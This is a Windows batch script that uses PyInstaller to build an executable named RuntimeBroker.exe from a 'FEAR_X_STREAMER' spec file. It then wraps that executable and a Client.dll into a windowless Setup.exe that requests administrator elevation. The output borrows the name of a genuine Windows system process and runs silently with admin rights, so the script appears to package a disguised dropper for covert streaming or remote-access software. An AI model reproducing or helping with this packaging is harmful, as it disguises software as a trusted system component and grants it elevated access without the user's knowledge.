@echo off
title BUILD STANDALONE SETUP.EXE
cd /d "%~dp0"
cls

echo ====================================================
echo      BUILDING SINGLE STANDALONE SETUP.EXE
echo ====================================================
echo.

set "PYTHON_CMD="
python --version >nul 2>&1
if %errorlevel% equ 0 (
    set "PYTHON_CMD=python"
) else (
    py --version >nul 2>&1
    if %errorlevel% equ 0 (
        set "PYTHON_CMD=py"
    )
)

if "%PYTHON_CMD%"=="" (
    echo [ERROR] Python was not found in your PATH!
    echo Please make sure Python is installed.
    pause
    exit /b 1
)

echo [1] Ensuring PyInstaller and dependencies are installed...
%PYTHON_CMD% -m pip install pyinstaller
%PYTHON_CMD% -m pip install -r requirements.txt

set "EXE_SRC="
if exist "dist_nuitka\RuntimeBroker.exe" (
    set "EXE_SRC=dist_nuitka\RuntimeBroker.exe"
) else if exist "dist\RuntimeBroker.exe" (
    set "EXE_SRC=dist\RuntimeBroker.exe"
)

if "%EXE_SRC%"=="" (
    echo.
    echo [2] Building RuntimeBroker.exe with PyInstaller...
    %PYTHON_CMD% -m PyInstaller FEAR_X_STREAMER.spec --noconfirm
    set "EXE_SRC=dist\RuntimeBroker.exe"
)

if not exist "%EXE_SRC%" (
    echo [ERROR] Could not find or build RuntimeBroker.exe!
    pause
    exit /b 1
)

echo.
set "FULL_EXE_SRC=%~dp0%EXE_SRC%"
set "FULL_DLL_SRC=%~dp0..\Client.dll"

echo Source EXE: "%FULL_EXE_SRC%"
echo Source DLL: "%FULL_DLL_SRC%"
echo.

%PYTHON_CMD% -m PyInstaller --onefile --noconsole --uac-admin --add-data "%FULL_EXE_SRC%;." --add-data "%FULL_DLL_SRC%;." --name "Setup" --distpath "output_setup" --noconfirm installer.py

if %errorlevel% equ 0 (
    echo.
    echo ====================================================
    echo SUCCESS! Standalone Setup.exe created:
    echo output_setup\Setup.exe
    echo ====================================================
) else (
    echo.
    echo [ERROR] Setup.exe packaging failed.
)

pause
